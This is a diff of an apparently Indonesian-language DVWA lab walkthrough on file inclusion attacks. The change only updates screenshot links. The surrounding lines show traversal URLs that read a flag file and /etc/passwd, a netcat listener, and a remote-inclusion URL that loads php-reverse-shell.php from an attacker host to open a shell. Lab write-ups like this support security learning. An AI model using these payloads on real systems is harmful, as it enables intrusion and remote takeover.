@@ -6,20 +6,20 @@ File Inclusion Attack adalah jenis celah keamanan web yang memungkinkan penyeran
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file4.php
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%205.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%201.JPG)
 
 ```sh
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%206.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%202.JPG)
 
 Membuka isi file **/etc/passwd** di server
 ```sh
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%203.JPG)
 
 Menjalankan file **php-reverse-shell.php** ke server
 ```sh
@@ -32,9 +32,9 @@ nc -lnvp <port>
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=http://<IP_Attacker>/php-reverse-shell.php
 ```
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2034.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%204.JPG)
 
-![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2035.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/file%20inclusion/file%20inclusion%205.JPG)
 
 ## Security Medium
 ```sh
